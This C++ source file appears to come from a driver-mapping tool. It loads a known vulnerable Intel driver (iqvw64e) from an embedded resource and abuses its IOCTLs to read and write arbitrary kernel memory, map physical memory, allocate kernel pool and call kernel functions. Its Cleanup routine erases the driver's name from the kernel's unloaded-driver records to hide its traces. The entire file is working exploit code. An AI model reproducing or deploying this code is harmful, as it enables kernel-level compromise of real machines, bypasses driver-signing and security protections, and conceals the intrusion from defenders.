#include "intel_driver.hpp"

bool intel_driver::Iqvw64e::Load()
{
	std::cout << "[<] Loading vulnerable driver" << std::endl;
		
	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);

	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
	{
		std::cout << "[-] Failed to get temp path" << std::endl;
		return false;
	}

	this->m_driver_path = std::string(temp_directory) + "\\" + driver_name;
		
	if (!utils::CreateFileFromMemory(this->m_driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
	{
		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
		return false;
	}
	
	if (!service::RegisterAndStart(driver_name, this->m_driver_path))
	{
		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
		return false;
	}
	   	 
	this->m_device_handle = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (this->m_device_handle == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Failed to get handle to the vulnerable driver" << std::endl;
		return false;
	}
			
	return true;
}

void intel_driver::Iqvw64e::Unload()
{
	std::cout << "[<] Unloading vulnerable driver" << std::endl;
	
	this->Cleanup();
	CloseHandle(this->m_device_handle);

	service::StopAndRemove(driver_name);
	std::remove(this->m_driver_path.c_str());
}

bool intel_driver::Iqvw64e::CpyMemory(const uint64_t destination, const uint64_t source, const uint64_t size)
{
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;
		
	DWORD bytes_returned = 0;

	return DeviceIoControl(this->m_device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::Iqvw64e::SetMemory(const uint64_t address, const uint32_t value, const uint64_t size)
{
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(this->m_device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::Iqvw64e::GetPhysicalAddress(const uint64_t address, uint64_t* out_physical_address)
{
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(this->m_device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::Iqvw64e::MapIoSpace(const uint64_t physical_address, const uint32_t size)
{
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(this->m_device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::Iqvw64e::UnmapIoSpace(const uint64_t address, const uint32_t size)
{
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(this->m_device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::Iqvw64e::ReadMemory(const uint64_t address, void* buffer, const uint64_t size)
{
	return this->CpyMemory(reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::Iqvw64e::WriteMemory(const uint64_t address, void* buffer, const uint64_t size)
{
	return this->CpyMemory(address, reinterpret_cast<uint64_t>(buffer), size);
}

uint64_t intel_driver::Iqvw64e::AllocatePool(const nt::POOL_TYPE pool_type, const uint64_t size)
{
	if (!size)
		return 0;
		   
	static uint64_t kernel_ExAllocatePoolWithTag = 0;

	if (!kernel_ExAllocatePoolWithTag)
		kernel_ExAllocatePoolWithTag = this->GetKernelModuleExport(utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePool");
		
	uint64_t aligned_page_size = nt::PAGE_SIZE;

	if (!(size % nt::PAGE_SIZE))
		aligned_page_size = size;
	else
		aligned_page_size = (size / nt::PAGE_SIZE) * nt::PAGE_SIZE + nt::PAGE_SIZE;

	uint64_t allocated_pool = 0;
	this->CallKernelFunction(&allocated_pool, kernel_ExAllocatePoolWithTag, pool_type, aligned_page_size);
	
	return allocated_pool;
}

bool intel_driver::Iqvw64e::FreePool(const uint64_t address)
{
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePoolWithTag = 0;

	if (!kernel_ExFreePoolWithTag)
		kernel_ExFreePoolWithTag = this->GetKernelModuleExport(utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");

	return this->CallKernelFunction<void>(nullptr, kernel_ExFreePoolWithTag, address);
}

uint64_t intel_driver::Iqvw64e::GetKernelModuleExport(const uint64_t kernel_module_base, const std::string &function_name)
{
	if (!kernel_module_base)
		return 0;
	
	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!this->ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!this->ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;
	
	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;
	
	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!this->ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (_stricmp(current_function_name.c_str(), function_name.c_str()))
			continue;

		const auto current_ordinal = ordinal_table[i];
		const auto current_address = kernel_module_base + function_table[current_ordinal];

		if (current_address >= kernel_module_base + export_base && current_address <= kernel_module_base + export_base + export_base_size)
		{
			char buffer[MAX_PATH] = { 0 };
			this->ReadMemory(current_address, buffer, sizeof(buffer));

			const std::string forwaded_name(buffer);

			const std::string forwaded_module_name = forwaded_name.substr(0, forwaded_name.find(".")) + ".dll";
			const std::string forwaded_function_name = forwaded_name.substr(forwaded_name.find(".") + 1, forwaded_function_name.npos);

			VirtualFree(export_data, 0, MEM_RELEASE);
			return this->GetKernelModuleExport(utils::GetKernelModuleAddress(forwaded_module_name), forwaded_function_name);
		}

		VirtualFree(export_data, 0, MEM_RELEASE);
		return current_address;
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::Iqvw64e::WriteToReadOnlyMemory(const uint64_t address, void* buffer, const uint32_t size)
{
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!this->GetPhysicalAddress(address, &physical_address))
		return false;

	const uint64_t mapped_physical_memory = this->MapIoSpace(physical_address, size);

	if (!mapped_physical_memory)
		return false;

	bool result = this->WriteMemory(mapped_physical_memory, buffer, size);

	if (!this->UnmapIoSpace(mapped_physical_memory, size))
		std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;

	return result;
}

bool intel_driver::Iqvw64e::Cleanup()	// Prevents system from listing the vulnerable driver in MmUnloadedDrivers
{
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == this->m_device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!this->ReadMemory(object + 0x8, &device_object, sizeof(device_object)))
		return false;

	//std::cout << "[+] device object: 0x" << reinterpret_cast<void*>(device_object) << std::endl;

	uint64_t driver_object = 0;

	if (!this->ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)))
		return false;

	//std::cout << "[+] driver object: 0x" << reinterpret_cast<void*>(driver_object) << std::endl;

	uint64_t driver_section = 0;

	if (!this->ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)))
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!this->ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	wchar_t wname[MAX_PATH] = { 0 };

	if (!this->ReadMemory(reinterpret_cast<uint64_t>(us_driver_base_dll_name.Buffer), wname, us_driver_base_dll_name.Length))
		return false;

	if (!wname || !wcslen(wname))
		return false;

	if (_stricmp(driver_name.c_str(), CW2A(wname)))
		return false;

	us_driver_base_dll_name.Length = 0;

	if (!this->WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	return true;
}